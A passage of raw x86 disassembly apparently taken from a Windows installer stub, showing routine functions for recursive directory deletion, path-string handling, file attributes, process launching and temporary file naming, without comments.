  405743:	0f 85 a1 00 00 00    	jne    0x4057ea
  405749:	8b 45 0c             	mov    0xc(%ebp),%eax
  40574c:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  40574f:	c7 45 d4 48 02 45 00 	movl   $0x450248,-0x2c(%ebp)
  405756:	c7 45 d8 00 80 00 00 	movl   $0x8000,-0x28(%ebp)
  40575d:	89 45 08             	mov    %eax,0x8(%ebp)
  405760:	bf 73 10 00 00       	mov    $0x1073,%edi
  405765:	ff 4d 08             	decl   0x8(%ebp)
  405768:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40576b:	50                   	push   %eax
  40576c:	ff 75 08             	push   0x8(%ebp)
  40576f:	57                   	push   %edi
  405770:	ff 75 fc             	push   -0x4(%ebp)
  405773:	ff 15 18 82 40 00    	call   *0x408218
  405779:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40577c:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405780:	75 e3                	jne    0x405765
  405782:	53                   	push   %ebx
  405783:	ff 15 d8 81 40 00    	call   *0x4081d8
  405789:	ff 15 d4 81 40 00    	call   *0x4081d4
  40578f:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405792:	50                   	push   %eax
  405793:	6a 42                	push   $0x42
  405795:	ff 15 34 81 40 00    	call   *0x408134
  40579b:	50                   	push   %eax
  40579c:	89 45 08             	mov    %eax,0x8(%ebp)
  40579f:	ff 15 2c 81 40 00    	call   *0x40812c
  4057a5:	8b f0                	mov    %eax,%esi
  4057a7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4057aa:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  4057ad:	50                   	push   %eax
  4057ae:	53                   	push   %ebx
  4057af:	57                   	push   %edi
  4057b0:	ff 75 fc             	push   -0x4(%ebp)
  4057b3:	ff 15 18 82 40 00    	call   *0x408218
  4057b9:	8d 34 46             	lea    (%esi,%eax,2),%esi
  4057bc:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  4057c1:	46                   	inc    %esi
  4057c2:	46                   	inc    %esi
  4057c3:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  4057c8:	46                   	inc    %esi
  4057c9:	46                   	inc    %esi
  4057ca:	43                   	inc    %ebx
  4057cb:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  4057ce:	7c d7                	jl     0x4057a7
  4057d0:	ff 75 08             	push   0x8(%ebp)
  4057d3:	ff 15 30 81 40 00    	call   *0x408130
  4057d9:	ff 75 08             	push   0x8(%ebp)
  4057dc:	6a 0d                	push   $0xd
  4057de:	ff 15 d0 81 40 00    	call   *0x4081d0
  4057e4:	ff 15 cc 81 40 00    	call   *0x4081cc
  4057ea:	33 c0                	xor    %eax,%eax
  4057ec:	e9 a9 fe ff ff       	jmp    0x40569a
  4057f1:	55                   	push   %ebp
  4057f2:	8b ec                	mov    %esp,%ebp
  4057f4:	83 ec 20             	sub    $0x20,%esp
  4057f7:	b8 f8 83 40 00       	mov    $0x4083f8,%eax
  4057fc:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405800:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405803:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405806:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405809:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  40580d:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405811:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405814:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405817:	56                   	push   %esi
  405818:	50                   	push   %eax
  405819:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  40581d:	ff 75 08             	push   0x8(%ebp)
  405820:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405826:	c7 45 f0 e8 83 40 00 	movl   $0x4083e8,-0x10(%ebp)
  40582d:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405834:	ff 15 c8 80 40 00    	call   *0x4080c8
  40583a:	85 c0                	test   %eax,%eax
  40583c:	74 04                	je     0x405842
  40583e:	33 c0                	xor    %eax,%eax
  405840:	eb 27                	jmp    0x405869
  405842:	8b 35 c4 80 40 00    	mov    0x4080c4,%esi
  405848:	ff d6                	call   *%esi
  40584a:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40584f:	75 18                	jne    0x405869
  405851:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405854:	50                   	push   %eax
  405855:	68 07 00 00 80       	push   $0x80000007
  40585a:	ff 75 08             	push   0x8(%ebp)
  40585d:	ff 15 0c 80 40 00    	call   *0x40800c
  405863:	85 c0                	test   %eax,%eax
  405865:	75 d7                	jne    0x40583e
  405867:	ff d6                	call   *%esi
  405869:	5e                   	pop    %esi
  40586a:	c9                   	leave
  40586b:	c2 04 00             	ret    $0x4
  40586e:	6a 00                	push   $0x0
  405870:	ff 74 24 08          	push   0x8(%esp)
  405874:	ff 15 c8 80 40 00    	call   *0x4080c8
  40587a:	85 c0                	test   %eax,%eax
  40587c:	74 04                	je     0x405882
  40587e:	33 c0                	xor    %eax,%eax
  405880:	eb 06                	jmp    0x405888
  405882:	ff 15 c4 80 40 00    	call   *0x4080c4
  405888:	c2 04 00             	ret    $0x4
  40588b:	6a 05                	push   $0x5
  40588d:	e8 02 0e 00 00       	call   0x406694
  405892:	85 c0                	test   %eax,%eax
  405894:	74 0a                	je     0x4058a0
  405896:	ff d0                	call   *%eax
  405898:	85 c0                	test   %eax,%eax
  40589a:	74 04                	je     0x4058a0
  40589c:	33 c0                	xor    %eax,%eax
  40589e:	40                   	inc    %eax
  40589f:	c3                   	ret
  4058a0:	33 c0                	xor    %eax,%eax
  4058a2:	c3                   	ret
  4058a3:	55                   	push   %ebp
  4058a4:	8b ec                	mov    %esp,%ebp
  4058a6:	83 ec 10             	sub    $0x10,%esp
  4058a9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4058ac:	c7 05 50 82 46 00 44 	movl   $0x44,0x468250
  4058b3:	00 00 00 
  4058b6:	50                   	push   %eax
  4058b7:	33 c0                	xor    %eax,%eax
  4058b9:	68 50 82 46 00       	push   $0x468250
  4058be:	50                   	push   %eax
  4058bf:	50                   	push   %eax
  4058c0:	68 00 00 00 04       	push   $0x4000000
  4058c5:	50                   	push   %eax
  4058c6:	50                   	push   %eax
  4058c7:	50                   	push   %eax
  4058c8:	ff 75 08             	push   0x8(%ebp)
  4058cb:	50                   	push   %eax
  4058cc:	ff 15 cc 80 40 00    	call   *0x4080cc
  4058d2:	85 c0                	test   %eax,%eax
  4058d4:	74 0c                	je     0x4058e2
  4058d6:	ff 75 f4             	push   -0xc(%ebp)
  4058d9:	ff 15 20 81 40 00    	call   *0x408120
  4058df:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4058e2:	c9                   	leave
  4058e3:	c2 04 00             	ret    $0x4
  4058e6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4058ea:	50                   	push   %eax
  4058eb:	83 60 24 00          	andl   $0x0,0x24(%eax)
  4058ef:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  4058f5:	ff 15 7c 81 40 00    	call   *0x40817c
  4058fb:	c2 04 00             	ret    $0x4
  4058fe:	ff 25 ec 81 40 00    	jmp    *0x4081ec
  405904:	68 00 20 00 00       	push   $0x2000
  405909:	ff 74 24 0c          	push   0xc(%esp)
  40590d:	ff 74 24 0c          	push   0xc(%esp)
  405911:	ff 35 b8 2e 47 00    	push   0x472eb8
  405917:	ff 15 f0 81 40 00    	call   *0x4081f0
  40591d:	c2 08 00             	ret    $0x8
  405920:	8b 44 24 08          	mov    0x8(%esp),%eax
  405924:	8b c8                	mov    %eax,%ecx
  405926:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  40592c:	83 3d a0 af 47 00 00 	cmpl   $0x0,0x47afa0
  405933:	74 05                	je     0x40593a
  405935:	c1 e8 15             	shr    $0x15,%eax
  405938:	75 47                	jne    0x405981
  40593a:	83 3d a8 af 47 00 00 	cmpl   $0x0,0x47afa8
  405941:	74 06                	je     0x405949
  405943:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405949:	a1 e8 ae 47 00       	mov    0x47aee8,%eax
  40594e:	68 b8 a3 40 00       	push   $0x40a3b8
  405953:	a3 bc a3 40 00       	mov    %eax,0x40a3bc
  405958:	a1 e0 ae 47 00       	mov    0x47aee0,%eax
  40595d:	a3 c0 a3 40 00       	mov    %eax,0x40a3c0
  405962:	8b 44 24 08          	mov    0x8(%esp),%eax
  405966:	a3 c4 a3 40 00       	mov    %eax,0x40a3c4
  40596b:	c7 05 c8 a3 40 00 e0 	movl   $0x472ee0,0x40a3c8
  405972:	2e 47 00 
  405975:	89 0d cc a3 40 00    	mov    %ecx,0x40a3cc
  40597b:	ff 15 f4 81 40 00    	call   *0x4081f4
  405981:	c2 08 00             	ret    $0x8
  405984:	56                   	push   %esi
  405985:	8b 74 24 08          	mov    0x8(%esp),%esi
  405989:	57                   	push   %edi
  40598a:	56                   	push   %esi
  40598b:	e8 fb 03 00 00       	call   0x405d8b
  405990:	8b f8                	mov    %eax,%edi
  405992:	83 ff ff             	cmp    $0xffffffff,%edi
  405995:	74 2e                	je     0x4059c5
  405997:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  40599c:	56                   	push   %esi
  40599d:	74 08                	je     0x4059a7
  40599f:	ff 15 d0 80 40 00    	call   *0x4080d0
  4059a5:	eb 06                	jmp    0x4059ad
  4059a7:	ff 15 40 81 40 00    	call   *0x408140
  4059ad:	85 c0                	test   %eax,%eax
  4059af:	74 05                	je     0x4059b6
  4059b1:	33 c0                	xor    %eax,%eax
  4059b3:	40                   	inc    %eax
  4059b4:	eb 11                	jmp    0x4059c7
  4059b6:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  4059bb:	75 08                	jne    0x4059c5
  4059bd:	57                   	push   %edi
  4059be:	56                   	push   %esi
  4059bf:	ff 15 74 80 40 00    	call   *0x408074
  4059c5:	33 c0                	xor    %eax,%eax
  4059c7:	5f                   	pop    %edi
  4059c8:	5e                   	pop    %esi
  4059c9:	c2 08 00             	ret    $0x8
  4059cc:	55                   	push   %ebp
  4059cd:	8b ec                	mov    %esp,%ebp
  4059cf:	81 ec 58 02 00 00    	sub    $0x258,%esp
  4059d5:	53                   	push   %ebx
  4059d6:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4059d9:	56                   	push   %esi
  4059da:	57                   	push   %edi
  4059db:	8b 7d 08             	mov    0x8(%ebp),%edi
  4059de:	8b c3                	mov    %ebx,%eax
  4059e0:	83 e0 04             	and    $0x4,%eax
  4059e3:	57                   	push   %edi
  4059e4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059e7:	e8 ab 02 00 00       	call   0x405c97
  4059ec:	f6 c3 08             	test   $0x8,%bl
  4059ef:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4059f2:	74 17                	je     0x405a0b
  4059f4:	57                   	push   %edi
  4059f5:	ff 15 40 81 40 00    	call   *0x408140
  4059fb:	f7 d8                	neg    %eax
  4059fd:	1b c0                	sbb    %eax,%eax
  4059ff:	40                   	inc    %eax
  405a00:	01 05 88 af 47 00    	add    %eax,0x47af88
  405a06:	e9 7d 01 00 00       	jmp    0x405b88
  405a0b:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405a0e:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405a12:	74 11                	je     0x405a25
  405a14:	85 c0                	test   %eax,%eax
  405a16:	0f 84 1a 01 00 00    	je     0x405b36
  405a1c:	f6 c3 02             	test   $0x2,%bl
  405a1f:	0f 84 11 01 00 00    	je     0x405b36
  405a25:	be 50 02 46 00       	mov    $0x460250,%esi
  405a2a:	57                   	push   %edi
  405a2b:	56                   	push   %esi
  405a2c:	e8 89 08 00 00       	call   0x4062ba
  405a31:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405a35:	74 0d                	je     0x405a44
  405a37:	68 4c a5 40 00       	push   $0x40a54c
  405a3c:	56                   	push   %esi
  405a3d:	e8 94 08 00 00       	call   0x4062d6
  405a42:	eb 06                	jmp    0x405a4a
  405a44:	57                   	push   %edi
  405a45:	e8 91 01 00 00       	call   0x405bdb
  405a4a:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405a4e:	75 0a                	jne    0x405a5a
  405a50:	66 83 3d 50 02 46 00 	cmpw   $0x5c,0x460250
  405a57:	5c 
  405a58:	75 0b                	jne    0x405a65
  405a5a:	68 14 a0 40 00       	push   $0x40a014
  405a5f:	57                   	push   %edi
  405a60:	e8 71 08 00 00       	call   0x4062d6
  405a65:	57                   	push   %edi
  405a66:	e8 65 08 00 00       	call   0x4062d0
  405a6b:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405a6e:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405a74:	50                   	push   %eax
  405a75:	56                   	push   %esi
  405a76:	ff 15 38 81 40 00    	call   *0x408138
  405a7c:	8b f0                	mov    %eax,%esi
  405a7e:	83 fe ff             	cmp    $0xffffffff,%esi
  405a81:	0f 84 a4 00 00 00    	je     0x405b2b
  405a87:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405a8e:	2e 
  405a8f:	75 1e                	jne    0x405aaf
  405a91:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405a98:	00 
  405a99:	74 73                	je     0x405b0e
  405a9b:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405aa2:	2e 
  405aa3:	75 0a                	jne    0x405aaf
  405aa5:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405aac:	00 
  405aad:	74 5f                	je     0x405b0e
  405aaf:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405ab5:	50                   	push   %eax
  405ab6:	53                   	push   %ebx
  405ab7:	e8 fe 07 00 00       	call   0x4062ba
  405abc:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405ac3:	74 15                	je     0x405ada
  405ac5:	8b 45 0c             	mov    0xc(%ebp),%eax
  405ac8:	83 e0 03             	and    $0x3,%eax
  405acb:	3c 03                	cmp    $0x3,%al
  405acd:	75 3f                	jne    0x405b0e
  405acf:	ff 75 0c             	push   0xc(%ebp)
  405ad2:	57                   	push   %edi
  405ad3:	e8 f4 fe ff ff       	call   0x4059cc
  405ad8:	eb 34                	jmp    0x405b0e
  405ada:	ff 75 fc             	push   -0x4(%ebp)
  405add:	57                   	push   %edi
  405ade:	e8 a1 fe ff ff       	call   0x405984
  405ae3:	85 c0                	test   %eax,%eax
  405ae5:	75 1f                	jne    0x405b06
  405ae7:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405aea:	74 12                	je     0x405afe
  405aec:	57                   	push   %edi
  405aed:	6a f1                	push   $0xfffffff1
  405aef:	e8 2e f8 ff ff       	call   0x405322
  405af4:	6a 00                	push   $0x0
  405af6:	57                   	push   %edi
  405af7:	e8 84 05 00 00       	call   0x406080
  405afc:	eb 10                	jmp    0x405b0e
  405afe:	ff 05 88 af 47 00    	incl   0x47af88
  405b04:	eb 08                	jmp    0x405b0e
  405b06:	57                   	push   %edi
  405b07:	6a f2                	push   $0xfffffff2
  405b09:	e8 14 f8 ff ff       	call   0x405322
  405b0e:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405b14:	50                   	push   %eax
  405b15:	56                   	push   %esi
  405b16:	ff 15 3c 81 40 00    	call   *0x40813c
  405b1c:	85 c0                	test   %eax,%eax
  405b1e:	0f 85 63 ff ff ff    	jne    0x405a87
  405b24:	56                   	push   %esi
  405b25:	ff 15 4c 81 40 00    	call   *0x40814c
  405b2b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405b2f:	74 05                	je     0x405b36
  405b31:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405b36:	33 f6                	xor    %esi,%esi
  405b38:	39 75 08             	cmp    %esi,0x8(%ebp)
  405b3b:	74 4b                	je     0x405b88
  405b3d:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405b40:	75 08                	jne    0x405b4a
  405b42:	ff 05 88 af 47 00    	incl   0x47af88
  405b48:	eb 3e                	jmp    0x405b88
  405b4a:	57                   	push   %edi
  405b4b:	e8 ad 0a 00 00       	call   0x4065fd
  405b50:	85 c0                	test   %eax,%eax
  405b52:	74 34                	je     0x405b88
  405b54:	57                   	push   %edi
  405b55:	e8 35 00 00 00       	call   0x405b8f
  405b5a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b5d:	0c 01                	or     $0x1,%al
  405b5f:	50                   	push   %eax
  405b60:	57                   	push   %edi
  405b61:	e8 1e fe ff ff       	call   0x405984
  405b66:	85 c0                	test   %eax,%eax
  405b68:	75 16                	jne    0x405b80
  405b6a:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405b6d:	74 d3                	je     0x405b42
  405b6f:	57                   	push   %edi
  405b70:	6a f1                	push   $0xfffffff1
  405b72:	e8 ab f7 ff ff       	call   0x405322
  405b77:	56                   	push   %esi
  405b78:	57                   	push   %edi
  405b79:	e8 02 05 00 00       	call   0x406080
  405b7e:	eb 08                	jmp    0x405b88
  405b80:	57                   	push   %edi
  405b81:	6a e5                	push   $0xffffffe5
  405b83:	e8 9a f7 ff ff       	call   0x405322
  405b88:	5f                   	pop    %edi
  405b89:	5e                   	pop    %esi
  405b8a:	5b                   	pop    %ebx
  405b8b:	c9                   	leave
  405b8c:	c2 08 00             	ret    $0x8
  405b8f:	56                   	push   %esi
  405b90:	8b 74 24 08          	mov    0x8(%esp),%esi
  405b94:	56                   	push   %esi
  405b95:	e8 36 07 00 00       	call   0x4062d0
  405b9a:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405b9d:	50                   	push   %eax
  405b9e:	56                   	push   %esi
  405b9f:	ff 15 f8 81 40 00    	call   *0x4081f8
  405ba5:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405ba9:	74 0b                	je     0x405bb6
  405bab:	68 14 a0 40 00       	push   $0x40a014
  405bb0:	56                   	push   %esi
  405bb1:	e8 20 07 00 00       	call   0x4062d6
  405bb6:	8b c6                	mov    %esi,%eax
  405bb8:	5e                   	pop    %esi
  405bb9:	c2 04 00             	ret    $0x4
  405bbc:	8b 44 24 04          	mov    0x4(%esp),%eax
  405bc0:	eb 0e                	jmp    0x405bd0
  405bc2:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405bc7:	74 0f                	je     0x405bd8
  405bc9:	50                   	push   %eax
  405bca:	ff 15 48 82 40 00    	call   *0x408248
  405bd0:	66 8b 08             	mov    (%eax),%cx
  405bd3:	66 85 c9             	test   %cx,%cx
  405bd6:	75 ea                	jne    0x405bc2
  405bd8:	c2 08 00             	ret    $0x8
  405bdb:	56                   	push   %esi
  405bdc:	8b 74 24 08          	mov    0x8(%esp),%esi
  405be0:	56                   	push   %esi
  405be1:	e8 ea 06 00 00       	call   0x4062d0
  405be6:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405be9:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405bed:	74 0c                	je     0x405bfb
  405bef:	50                   	push   %eax
  405bf0:	56                   	push   %esi
  405bf1:	ff 15 f8 81 40 00    	call   *0x4081f8
  405bf7:	3b c6                	cmp    %esi,%eax
  405bf9:	77 ee                	ja     0x405be9
  405bfb:	66 83 20 00          	andw   $0x0,(%eax)
  405bff:	83 c0 02             	add    $0x2,%eax
  405c02:	5e                   	pop    %esi
  405c03:	c2 04 00             	ret    $0x4
  405c06:	8b 54 24 04          	mov    0x4(%esp),%edx
  405c0a:	66 8b 0a             	mov    (%edx),%cx
  405c0d:	8b c1                	mov    %ecx,%eax
  405c0f:	0c 20                	or     $0x20,%al
  405c11:	66 83 f9 5c          	cmp    $0x5c,%cx
  405c15:	75 06                	jne    0x405c1d
  405c17:	66 39 4a 02          	cmp    %cx,0x2(%edx)
  405c1b:	74 13                	je     0x405c30
  405c1d:	66 3d 61 00          	cmp    $0x61,%ax
  405c21:	72 12                	jb     0x405c35
  405c23:	66 3d 7a 00          	cmp    $0x7a,%ax
  405c27:	77 0c                	ja     0x405c35
  405c29:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  405c2e:	75 05                	jne    0x405c35
  405c30:	33 c0                	xor    %eax,%eax
  405c32:	40                   	inc    %eax
  405c33:	eb 02                	jmp    0x405c37
  405c35:	33 c0                	xor    %eax,%eax
  405c37:	c2 04 00             	ret    $0x4
  405c3a:	53                   	push   %ebx
  405c3b:	56                   	push   %esi
  405c3c:	8b 35 48 82 40 00    	mov    0x408248,%esi
  405c42:	57                   	push   %edi
  405c43:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405c47:	57                   	push   %edi
  405c48:	ff d6                	call   *%esi
  405c4a:	8b d8                	mov    %eax,%ebx
  405c4c:	53                   	push   %ebx
  405c4d:	ff d6                	call   *%esi
  405c4f:	66 8b 0f             	mov    (%edi),%cx
  405c52:	66 85 c9             	test   %cx,%cx
  405c55:	74 12                	je     0x405c69
  405c57:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  405c5b:	75 0c                	jne    0x405c69
  405c5d:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405c62:	75 05                	jne    0x405c69
  405c64:	50                   	push   %eax
  405c65:	ff d6                	call   *%esi
  405c67:	eb 28                	jmp    0x405c91
  405c69:	66 83 f9 5c          	cmp    $0x5c,%cx
  405c6d:	75 20                	jne    0x405c8f
  405c6f:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405c73:	75 1a                	jne    0x405c8f
  405c75:	6a 02                	push   $0x2
  405c77:	5e                   	pop    %esi
  405c78:	6a 5c                	push   $0x5c
  405c7a:	50                   	push   %eax
  405c7b:	4e                   	dec    %esi
  405c7c:	e8 3b ff ff ff       	call   0x405bbc
  405c81:	66 83 38 00          	cmpw   $0x0,(%eax)
  405c85:	74 08                	je     0x405c8f
  405c87:	40                   	inc    %eax
  405c88:	40                   	inc    %eax
  405c89:	85 f6                	test   %esi,%esi
  405c8b:	75 eb                	jne    0x405c78
  405c8d:	eb 02                	jmp    0x405c91
  405c8f:	33 c0                	xor    %eax,%eax
  405c91:	5f                   	pop    %edi
  405c92:	5e                   	pop    %esi
  405c93:	5b                   	pop    %ebx
  405c94:	c2 04 00             	ret    $0x4
  405c97:	56                   	push   %esi
  405c98:	57                   	push   %edi
  405c99:	ff 74 24 0c          	push   0xc(%esp)
  405c9d:	be 50 42 46 00       	mov    $0x464250,%esi
  405ca2:	56                   	push   %esi
  405ca3:	e8 12 06 00 00       	call   0x4062ba
  405ca8:	56                   	push   %esi
  405ca9:	e8 8c ff ff ff       	call   0x405c3a
  405cae:	8b f8                	mov    %eax,%edi
  405cb0:	85 ff                	test   %edi,%edi
  405cb2:	75 04                	jne    0x405cb8
  405cb4:	33 c0                	xor    %eax,%eax
  405cb6:	eb 58                	jmp    0x405d10
  405cb8:	57                   	push   %edi
  405cb9:	e8 90 08 00 00       	call   0x40654e
  405cbe:	f6 05 fc ae 47 00 80 	testb  $0x80,0x47aefc
  405cc5:	74 0e                	je     0x405cd5
  405cc7:	66 8b 07             	mov    (%edi),%ax
  405cca:	66 85 c0             	test   %ax,%ax
  405ccd:	74 e5                	je     0x405cb4
  405ccf:	66 3d 5c 00          	cmp    $0x5c,%ax
  405cd3:	74 df                	je     0x405cb4
  405cd5:	2b fe                	sub    %esi,%edi
  405cd7:	d1 ff                	sar    $1,%edi
  405cd9:	eb 14                	jmp    0x405cef
  405cdb:	e8 1d 09 00 00       	call   0x4065fd
  405ce0:	85 c0                	test   %eax,%eax
  405ce2:	74 05                	je     0x405ce9
  405ce4:	f6 00 10             	testb  $0x10,(%eax)
  405ce7:	74 cb                	je     0x405cb4
  405ce9:	56                   	push   %esi
  405cea:	e8 ec fe ff ff       	call   0x405bdb
  405cef:	56                   	push   %esi
  405cf0:	e8 db 05 00 00       	call   0x4062d0
  405cf5:	3b c7                	cmp    %edi,%eax
  405cf7:	56                   	push   %esi
  405cf8:	7f e1                	jg     0x405cdb
  405cfa:	e8 90 fe ff ff       	call   0x405b8f
  405cff:	56                   	push   %esi
  405d00:	ff 15 94 80 40 00    	call   *0x408094
  405d06:	33 c9                	xor    %ecx,%ecx
  405d08:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d0b:	0f 95 c1             	setne  %cl
  405d0e:	8b c1                	mov    %ecx,%eax
  405d10:	5f                   	pop    %edi
  405d11:	5e                   	pop    %esi
  405d12:	c2 04 00             	ret    $0x4
  405d15:	55                   	push   %ebp
  405d16:	8b ec                	mov    %esp,%ebp
  405d18:	51                   	push   %ecx
  405d19:	53                   	push   %ebx
  405d1a:	56                   	push   %esi
  405d1b:	57                   	push   %edi
  405d1c:	8b 3d 50 81 40 00    	mov    0x408150,%edi
  405d22:	ff 75 0c             	push   0xc(%ebp)
  405d25:	ff d7                	call   *%edi
  405d27:	8b 75 08             	mov    0x8(%ebp),%esi
  405d2a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405d2d:	eb 27                	jmp    0x405d56
  405d2f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d32:	ff 75 0c             	push   0xc(%ebp)
  405d35:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405d38:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405d3c:	56                   	push   %esi
  405d3d:	ff 15 d4 80 40 00    	call   *0x4080d4
  405d43:	85 c0                	test   %eax,%eax
  405d45:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405d48:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405d4b:	74 1a                	je     0x405d67
  405d4d:	56                   	push   %esi
  405d4e:	ff 15 fc 81 40 00    	call   *0x4081fc
  405d54:	8b f0                	mov    %eax,%esi
  405d56:	56                   	push   %esi
  405d57:	ff d7                	call   *%edi
  405d59:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405d5c:	7d d1                	jge    0x405d2f
  405d5e:	33 c0                	xor    %eax,%eax
  405d60:	5f                   	pop    %edi
  405d61:	5e                   	pop    %esi
  405d62:	5b                   	pop    %ebx
  405d63:	c9                   	leave
  405d64:	c2 08 00             	ret    $0x8
  405d67:	8b c6                	mov    %esi,%eax
  405d69:	eb f5                	jmp    0x405d60
  405d6b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405d6f:	56                   	push   %esi
  405d70:	8b 74 24 10          	mov    0x10(%esp),%esi
  405d74:	85 f6                	test   %esi,%esi
  405d76:	76 0f                	jbe    0x405d87
  405d78:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405d7c:	2b c1                	sub    %ecx,%eax
  405d7e:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405d81:	88 11                	mov    %dl,(%ecx)
  405d83:	41                   	inc    %ecx
  405d84:	4e                   	dec    %esi
  405d85:	75 f7                	jne    0x405d7e
  405d87:	5e                   	pop    %esi
  405d88:	c2 0c 00             	ret    $0xc
  405d8b:	56                   	push   %esi
  405d8c:	ff 74 24 08          	push   0x8(%esp)
  405d90:	ff 15 94 80 40 00    	call   *0x408094
  405d96:	8b f0                	mov    %eax,%esi
  405d98:	83 fe ff             	cmp    $0xffffffff,%esi
  405d9b:	74 0d                	je     0x405daa
  405d9d:	24 fe                	and    $0xfe,%al
  405d9f:	50                   	push   %eax
  405da0:	ff 74 24 0c          	push   0xc(%esp)
  405da4:	ff 15 74 80 40 00    	call   *0x408074
  405daa:	8b c6                	mov    %esi,%eax
  405dac:	5e                   	pop    %esi
  405dad:	c2 04 00             	ret    $0x4
  405db0:	ff 74 24 04          	push   0x4(%esp)
  405db4:	ff 15 94 80 40 00    	call   *0x408094
  405dba:	8b c8                	mov    %eax,%ecx
  405dbc:	6a 00                	push   $0x0
  405dbe:	41                   	inc    %ecx
  405dbf:	f7 d9                	neg    %ecx
  405dc1:	1b c9                	sbb    %ecx,%ecx
  405dc3:	23 c8                	and    %eax,%ecx
  405dc5:	51                   	push   %ecx
  405dc6:	ff 74 24 14          	push   0x14(%esp)
  405dca:	6a 00                	push   $0x0
  405dcc:	6a 01                	push   $0x1
  405dce:	ff 74 24 1c          	push   0x1c(%esp)
  405dd2:	ff 74 24 1c          	push   0x1c(%esp)
  405dd6:	ff 15 d8 80 40 00    	call   *0x4080d8
  405ddc:	c2 0c 00             	ret    $0xc
  405ddf:	55                   	push   %ebp
  405de0:	8b ec                	mov    %esp,%ebp
  405de2:	51                   	push   %ecx
  405de3:	51                   	push   %ecx
  405de4:	56                   	push   %esi
  405de5:	8b 75 08             	mov    0x8(%ebp),%esi
  405de8:	57                   	push   %edi
  405de9:	6a 64                	push   $0x64
  405deb:	5f                   	pop    %edi
  405dec:	a1 58 a5 40 00       	mov    0x40a558,%eax
  405df1:	4f                   	dec    %edi
  405df2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405df5:	a1 5c a5 40 00       	mov    0x40a55c,%eax
  405dfa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405dfd:	ff 15 7c 80 40 00    	call   *0x40807c
  405e03:	6a 1a                	push   $0x1a
  405e05:	33 d2                	xor    %edx,%edx
  405e07:	59                   	pop    %ecx
  405e08:	f7 f1                	div    %ecx
  405e0a:	56                   	push   %esi
  405e0b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405e0e:	6a 00                	push   $0x0
  405e10:	50                   	push   %eax
  405e11:	ff 75 0c             	push   0xc(%ebp)
  405e14:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  405e18:	ff 15 dc 80 40 00    	call   *0x4080dc
